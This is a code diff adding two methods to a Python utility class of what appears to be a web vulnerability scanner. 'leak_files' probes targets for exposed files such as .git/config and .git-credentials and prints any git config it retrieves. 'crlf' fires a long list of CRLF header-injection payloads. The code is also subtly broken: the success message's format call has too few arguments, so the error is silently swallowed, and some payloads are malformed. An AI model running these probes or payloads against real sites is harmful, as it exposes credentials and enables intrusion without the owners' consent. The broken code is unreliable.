@@ -67,7 +67,7 @@ class Util:
                 results.append(name)
         return results
 
-    def get_url_data(self, url, timeout=25):
+    def get_url_data(self, url, timeout=1):
         headers = {
             'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:38.0) Gecko/20100101 Firefox/38.0',
             'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
@@ -82,3 +82,122 @@ class Util:
         if resp is None:
             return 0
         return resp.text if hasattr(resp, "text") else resp.content
+
+    def leak_files(self, subdomain):
+        headers = {
+            'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:38.0) Gecko/20100101 Firefox/38.0',
+            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
+            'Accept-Language': 'en-GB,en;q=0.5',
+            'Accept-Encoding': 'gzip, deflate',
+            'Connection': 'keep-alive',
+        }
+        try:
+            findings_checks = [ 'testing.php', 'test.php', 'test1.php', 'test2.php', '_test.php', 'info.php', 'phpinfo.php', 'php_info.php', 'php.php', 'install.php', 'changelog.txt', 'README.md', 'install.txt', '.git/HEAD', '.git/index', '.git/config', '.gitignore', '.git-credentials', '.bzr/README', '.bzr/checkout/dirstate', '.hg/requires', '.hg/store/fncache', '.svn/entries', '.svn/all-wcprops', '.svn/wc.db', '.svnignore', 'CVS/Entries', '.cvsignore', '.idea/misc.xml', '.idea/workspace.xml', '.DS_Store', 'composer.lock', 'nbproject/project.xml']
+            for finding in findings_checks:
+                site = "http://{0}/{1}".format(subdomain, finding)
+                results = requests.get(site, timeout=1, verify=False, headers=headers)
+                if results:
+                    try:
+                        if results.status_code == 200:
+                            print("{}[{}][{}] HTTP {} {}".format(self.logger.Y, results.status_code, results.headers['content-length'], site, self.logger.W))
+                            git_found = re.match(r'\[core\]', results.text, re.M|re.I)
+                            if git_found:
+                                print("{}[{}] Git Found  {} {}".format(self.logger.Y, results.status_code, site, self.logger.W))
+                                print(results.text) 
+                    except Exception as e:
+                        pass
+                site = "https://{0}/{1}".format(subdomain, finding)
+                results = requests.get(site, timeout=1, verify=False, headers=headers)
+                if results:
+                    try:
+                        if results.status_code == 200:
+                            print("{}[{}][{}] HTTPS {} {}".format(self.logger.Y, results.status_code, results.headers['content-length'], site, self.logger.W))
+                            git_found = re.match(r'\[core\]', results.text, re.M|re.I)
+                            if git_found:
+                                print("{}[{}] Git Found HTTPS {} {}".format(self.logger.Y, results.status_code, site, self.logger.W))
+                                print(results.text)
+                    except Exception as e:
+                        pass
+        except Exception as e:
+                        pass
+
+    def crlf(self, subdomain):
+        # should create Set-Cookie:mycookie=myvalue header if vulnerable
+        payloads = [r"%0ASet-Cookie:mycookie=myvalue",
+                    r"%0A%20Set-Cookie:mycookie=myvalue",
+                    r"%20%0ASet-Cookie:mycookie=myvalue",
+                    r"%23%OASet-Cookie:mycookie=myvalue",
+                    r"%E5%98%8A%E5%98%8DSet-Cookie:mycookie=myvalue",
+                    r"%E5%98%8A%E5%98%8D%0ASet-Cookie:mycookie=myvalue",
+                    r"%3F%0ASet-Cookie:mycookie=myvalue",
+                    r"crlf%0ASet-Cookie:mycookie=myvalue",
+                    r"crlf%0A%20Set-Cookie:mycookie=myvalue",
+                    r"crlf%20%0ASet-Cookie:mycookie=myvalue",
+                    r"crlf%23%OASet-Cookie:mycookie=myvalue",
+                    r"crlf%E5%98%8A%E5%98%8DSet-Cookie:mycookie=myvalue",
+                    r"crlf%E5%98%8A%E5%98%8D%0ASet-Cookie:mycookie=myvalue",
+                    r"crlf%3F%0ASet-Cookie:mycookie=myvalue",
+                    r"%0DSet-Cookie:mycookie=myvalue",
+                    r"%0D%20Set-Cookie:mycookie=myvalue",
+                    r"%20%0DSet-Cookie:mycookie=myvalue",
+                    r"%23%0DSet-Cookie:mycookie=myvalue",
+                    r"%E5%98%8A%E5%98%8DSet-Cookie:mycookie=myvalue",
+                    r"%E5%98%8A%E5%98%8D%0DSet-Cookie:mycookie=myvalue",
+                    r"%3F%0DSet-Cookie:mycookie=myvalue",
+                    r"crlf%0DSet-Cookie:mycookie=myvalue",
+                    r"crlf%0D%20Set-Cookie:mycookie=myvalue",
+                    r"crlf%20%0DSet-Cookie:mycookie=myvalue",
+                    r"crlf%23%0DSet-Cookie:mycookie=myvalue",
+                    r"crlf%E5%98%8A%E5%98%8DSet-Cookie:mycookie=myvalue",
+                    r"crlf%E5%98%8A%E5%98%8D%0DSet-Cookie:mycookie=myvalue",
+                    r"crlf%3F%0DSet-Cookie:mycookie=myvalue",
+                    r"%0D%0ASet-Cookie:mycookie=myvalue",
+                    r"%0D%0A%20Set-Cookie:mycookie=myvalue",
+                    r"%20%0D%0ASet-Cookie:mycookie=myvalue",
+                    r"%23%0D%0ASet-Cookie:mycookie=myvalue",
+                    r"%E5%98%8A%E5%98%8DSet-Cookie:mycookie=myvalue",
+                    r"%E5%98%8A%E5%98%8D%0D%0ASet-Cookie:mycookie=myvalue",
+                    r"%3F%0D%0ASet-Cookie:mycookie=myvalue",
+                    r"crlf%0D%0ASet-Cookie:mycookie=myvalue",
+                    r"crlf%0D%0A%20Set-Cookie:mycookie=myvalue",
+                    r"crlf%20%0D%0ASet-Cookie:mycookie=myvalue",
+                    r"crlf%23%0D%0ASet-Cookie:mycookie=myvalue",
+                    r"crlf%E5%98%8A%E5%98%8DSet-Cookie:mycookie=myvalue",
+                    r"crlf%E5%98%8A%E5%98%8D%0D%0ASet-Cookie:mycookie=myvalue",
+                    r"crlf%3F%0D%0ASet-Cookie:mycookie=myvalue",
+                    r"%0D%0A%09Set-Cookie:mycookie=myvalue",
+                    r"crlf%0D%0A%09Set-Cookie:mycookie=myvalue",
+                    r"%250ASet-Cookie:mycookie=myvalue",
+                    r"%25250ASet-Cookie:mycookie=myvalue",
+                    r"%%0A0ASet-Cookie:mycookie=myvalue",
+                    r"%25%30ASet-Cookie:mycookie=myvalue",
+                    r"%25%30%61Set-Cookie:mycookie=myvalue",
+                    r"%u000ASet-Cookie:mycookie=myvalue",
+                    r"//www.google.com/%2F%2E%2E%0D%0ASet-Cookie:mycookie=myvalue",
+                    r"/www.google.com/%2E%2E%2F%0D%0ASet-Cookie:mycookie=myvalue",
+                    r"/google.com/%2F..%0D%0ASet-Cookie:mycookie=myvalue"]
+                    
+        headers = {
+            'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:38.0) Gecko/20100101 Firefox/38.0',
+            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
+            'Accept-Language': 'en-GB,en;q=0.5',
+            'Accept-Encoding': 'gzip, deflate',
+            'Connection': 'keep-alive',
+        }
+
+        for payload in payloads:
+            try:
+                site = "http://{0}/{1}".format(subdomain, payload)
+                results = requests.get(site, verify=False, timeout=.5, allow_redirects=False, headers=headers)
+                for name in results.cookies.keys():
+                    if "mycookie" in name:
+                        print("[+] Vulnerable: {0}{1}/{2}".format(site, payload))
+
+                site = "https://{0}/{1}".format(subdomain, payload)
+                results = requests.get(site, verify=False, timeout=.5, allow_redirects=False, headers=headers)
+                for name in results.cookies.keys():
+                    if "mycookie" in name:
+                        print("[+] Vulnerable: {0}{1}/{2}".format(site, payload))
+            except Exception as e:
+                pass
+        
